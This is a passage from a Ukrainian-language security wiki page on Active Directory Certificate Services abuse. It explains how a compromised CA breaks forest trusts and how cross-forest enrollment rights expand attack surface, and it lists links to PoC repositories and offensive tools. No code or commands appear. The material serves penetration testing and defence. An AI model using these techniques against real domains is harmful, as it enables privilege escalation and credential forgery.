### Порушення Forest Trusts через скомпрометовані CA

Конфігурацію **cross-forest enrollment** зроблено відносно простою. **Root CA certificate** з resource forest **публікується** адміністраторами у **account forests**, а сертифікати **enterprise CA** з resource forest **додаються до контейнерів `NTAuthCertificates` і AIA у кожному account forest**. Інакше кажучи, така конфігурація надає **CA у resource forest повний контроль** над усіма іншими forests, для яких він керує PKI. Якщо цей CA буде **скомпрометований attackers**, ними можуть бути **підроблені** сертифікати для всіх користувачів у resource та account forests, що порушить межу безпеки forest.<sup>[[6]](#references)</sup>

### Enrollment Privileges, надані Foreign Principals

У multi-forest environments потрібна обережність щодо Enterprise CA, які **публікують certificate templates**, що надають **Authenticated Users або foreign principals** (користувачам/групам за межами forest, якому належить Enterprise CA) **права на enrollment і редагування**.\
Під час authentication через trust AD додає **Authenticated Users SID** до token користувача. Отже, якщо domain має Enterprise CA із template, який **надає Authenticated Users права на enrollment**, користувач з іншого forest потенційно може **виконати enrollment у template**. Аналогічно, якщо **template явно надає права на enrollment foreign principal**, таким чином **створюється cross-forest access-control relationship**, що дає principal з одного forest змогу **виконати enrollment у template з іншого forest**.

Обидва сценарії призводять до **збільшення attack surface** з одного forest до іншого. Налаштування certificate template можуть бути використані attacker для отримання додаткових privileges в іноземному domain.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Технічний аналіз Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Блог SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Зловживання Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, нові методи authentication і request та інше](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Зловживання зіставленням Key Trust Account для захоплення account](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Історія Enhanced Key (не)використання](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying до AD Certificate Services через RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access до ADCS CA з YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Техніка зловживання ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Техніка зловживання ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Не просто ще один AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Неправильна конфігурація та Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Повторний розгляд “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC enrollment IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Privilege Escalation від IIS AppPool через AD CS RPC Endpoint](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Ідентичності Application Pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – команда pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Audit Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Подія 4768: запитано ticket authentication Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Подія 4769: запитано ticket служби Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
{{#include ../../../banners/hacktricks-training.md}}
